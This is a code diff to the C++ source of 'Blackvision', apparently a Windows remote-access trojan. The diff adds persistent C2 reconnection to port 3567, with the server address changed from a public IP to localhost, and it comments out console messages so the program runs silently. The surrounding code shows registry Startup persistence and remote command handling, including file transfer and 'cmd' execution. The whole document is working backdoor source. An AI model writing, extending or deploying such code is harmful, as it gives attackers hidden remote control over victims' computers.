@@ -2,6 +2,13 @@
 #include "blackvision.h"
 //#pragma warning (disable : 4996) enable this if in vs
 
+void Blackvision::reconnect()
+{
+	closesocket(sockfd);
+	WSACleanup();
+	Sleep(1000); // Reconnect 1 second interval
+	C2Connect();
+}
 void Blackvision::startup()
 {
 	TCHAR file[MAX_PATH];
@@ -20,7 +27,8 @@ void Blackvision::startup()
 		return;
 	}
 	else {
-		std::cout << "Program added to Startup.\n";
+		// std::cout << "Program added to Startup.\n";
+		// Do nothing, Program was added to Startup
 	}
 	RegCloseKey(NewVal);
 	
@@ -169,9 +177,9 @@ void Blackvision::ConnectionManage()
 			memset(file_commands, '\0', 500);
 			memset(filebuf, '\0', BUFFER);
 			strsplit(recvbuf, file_commands);
-			std::cout << "Receiving File " << file_commands[1] << std::endl;
+			// std::cout << "Receiving File " << file_commands[1] << std::endl;
 			recvFile();
-			std::cout << "Got File." << std::endl;
+			// std::cout << "Got File." << std::endl;
 			
 		}
 		else if (command == "wanip\n") {
@@ -199,6 +207,9 @@ void Blackvision::ConnectionManage()
 		else if (command == "username")
 		{
 			respond(username);
+		} else if(command == "kill")
+		{
+			connected = false;
 		}
 		else if (command.find("cmd") != std::string::npos)
 		{
@@ -213,6 +224,11 @@ void Blackvision::ConnectionManage()
 			No response - 
 			*/
 		}
+	}
+
+	if(!connected)
+	{
+		reconnect();
 	}
 }
 
@@ -229,31 +245,36 @@ void Blackvision::respond(const char * data) {
 
 void Blackvision::C2Connect()
 {
-	WSADATA wsa;
-	DWORD timeout = 3000;
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); };
-	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
+	while(true)
 	{
-		std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
-		exit(1);
-	}
-	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-	
-	server.sin_addr.s_addr = inet_addr("159.89.214.31");
-	server.sin_port = htons(3567);
-	server.sin_family = AF_INET;
+		WSADATA wsa;
+		DWORD timeout = 1000;
+		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { /* std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); */ return; };
+		sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
+		{
+			// std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
+			// exit(1);
+			return;
+		}
+		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+		
+		server.sin_addr.s_addr = inet_addr("127.0.0.1");
+		server.sin_port = htons(3567);
+		server.sin_family = AF_INET;
 
-	do {
-		if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-			std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
-			Sleep(1000);
-		}
-		else {
-			connected = true;
-			std::cout << "Connection Established." << std::endl;
-		}
-	} while (!connected); // Not Connected, While not connected.
+		do {
+			if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
+				// std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
+				reconnect();
+			}
+			else {
+				connected = true;
+				// std::cout << "Connection Established." << std::endl;
+			}
+		} while (!connected); // Not Connected, While not connected.
+		
+		ConnectionManage();
+	}
 	
-	ConnectionManage();
 }
